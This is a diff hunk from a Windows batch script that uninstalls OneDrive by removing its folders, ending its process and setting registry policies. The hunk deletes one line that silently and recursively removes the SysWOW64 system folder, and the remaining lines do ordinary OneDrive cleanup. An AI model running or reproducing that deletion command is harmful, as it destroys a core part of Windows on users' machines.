@@ -1705,7 +1705,7 @@ rd "%systemroot%/Users/%username%/OneDrive" /Q /S > NUL 2>&1
 rd "C:\OneDriveTemp" /Q /S > NUL 2>&1
 rd "%LOCALAPPDATA%\Microsoft\OneDrive" /Q /S > NUL 2>&1
 rd "%PROGRAMDATA%\Microsoft OneDrive" /Q /S > NUL 2>&1 
-rd "%Windir%\SysWOW64" /Q /S > NUL 2>&1 
+
 TASKKILL /F /IM OneDrive.exe /T 
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v "DisableFileSyncNGSC" /t REG_DWORD /d 1 /f 
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v "DisableLibrariesDefaultSaveToOneDrive" /t REG_DWORD /d 1 /f 
